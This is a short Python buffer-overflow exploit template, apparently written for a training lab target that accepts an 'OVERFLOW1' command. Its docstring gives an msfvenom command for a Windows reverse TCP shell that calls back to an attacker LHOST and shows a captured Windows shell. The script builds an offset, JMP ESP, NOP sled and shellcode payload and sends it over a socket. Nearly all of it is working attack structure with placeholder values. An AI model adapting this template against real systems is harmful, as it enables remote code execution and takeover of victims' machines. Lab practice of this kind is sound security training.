#!/usr/bin/python
"""
After succesfully testing our jumper script we can generate our msfvenom payload using the folowing syntax:
    msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f c -a x86 -b "<bad char>"

With the output generated add that to your shellcode variable. And boom! we 
have shell.

[]] password for bryan: 
listening on [any] 1337 ...
connect to [<IP>] from (UNKNOWN) [<IP>] 586
Microsoft Windows [Version 10.0.16299.15]
(c) 2017 Microsoft Corporation. All rights reserved.

@author: bryan
"""
import socket

RHOST = <IP>  #Target IP
RPORT = <PORT> 	   #Target Port


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

#msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f c -a x86 -b "<bad char>"
shellcode = ()


buf = "A" * <offset> + <jmp esp> + "\x90" * <NOPS> + shellcode

s.send("OVERFLOW1 " + buf)
s.recv(1024)
s.close()